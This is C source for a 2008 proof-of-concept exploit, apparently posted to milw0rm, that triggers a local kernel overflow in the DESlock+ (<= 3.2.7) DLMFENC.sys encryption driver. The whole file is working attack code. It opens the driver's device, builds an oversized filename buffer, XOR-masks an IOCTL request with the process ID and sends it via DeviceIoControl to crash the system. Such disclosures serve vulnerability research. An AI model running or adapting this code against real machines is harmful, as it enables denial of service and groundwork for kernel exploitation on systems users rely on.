/* deslock-overflow.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * DESlock+ <= 3.2.7 local kernel overflow POC
 * by mu-b - Sat 23 Feb 2008
 *
 * - Tested on: DLMFENC.sys 1.0.0.28
 *
 * http://www.cctmark.gov.uk/CCTMAwards/DataEncryptionSystemsLtd/tabid/103/Default.aspx
 * - I wonder what that says about CESG CCTM?
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>

#define DLMFENC_IOCTL   0x0FA4204C
#define DLMFENC_FLAG    0xC001D00D
#define DLMFENC_BUZ_SZ  0x1000

#define ARG_SIZE(a)     ((a-(sizeof (int)*2))/sizeof (void *))

struct ioctl_req {
  int flag;
  int req_num;
  void *arg[ARG_SIZE(0x20)];
};

static void
xor_mask_req (struct ioctl_req *req)
{
  DWORD i, pid;
  PCHAR ptr;

  pid = GetCurrentProcessId ();
  for (i = 0, ptr = (PCHAR) req; i < 0x0C; i++, ptr++)
    *ptr ^= pid;
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  CHAR buf[DLMFENC_BUZ_SZ + 128];
  HANDLE hFile;
  BOOL result;
  DWORD rlen;

  printf ("DESlock+ <= 3.2.7 local kernel overflow PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  fflush (stdout);
  hFile = CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  buf[0] = 'C';                           /* drive letter */
  memset (&buf[1], 0x41, sizeof buf - 1); /* filename     */
  buf[sizeof buf - 1] = '\0';

  memset (&req, 0, sizeof req);
  req.flag = DLMFENC_FLAG;
  req.req_num = 0x05;
  req.arg[0] = (void *) buf;
  sleep (2000);

  xor_mask_req (&req);
  result = DeviceIoControl (hFile, DLMFENC_IOCTL,
                            &req, sizeof req, &req, sizeof req, &rlen, 0);
  if (!result)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("* hmmm, you didn't STOP the box?!?! rlen: %d\n", rlen);

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-09-20]
